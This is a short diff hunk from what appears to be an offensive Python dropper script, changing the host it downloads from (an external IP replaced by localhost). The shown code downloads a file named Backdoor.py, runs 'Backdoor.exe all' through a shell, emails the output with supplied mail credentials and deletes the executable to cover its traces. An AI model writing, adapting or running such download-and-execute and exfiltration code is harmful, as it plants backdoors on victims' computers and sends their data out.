@@ -38,7 +38,7 @@ def send_mail(email, password, message):
 options = get_arguments()
 temp_directory = tempfile.gettempdir()
 os.chdir(temp_directory)
-download("http://93.31.82.227:8888/Python/Backdoor.py")
+download("http://127.0.0.1:8888/Python/Backdoor.py")
 result = subprocess.Popen("Backdoor.exe all", shell=True)
 send_mail(options.mail, options.password, result)
 os.remove("Backdoor.exe")
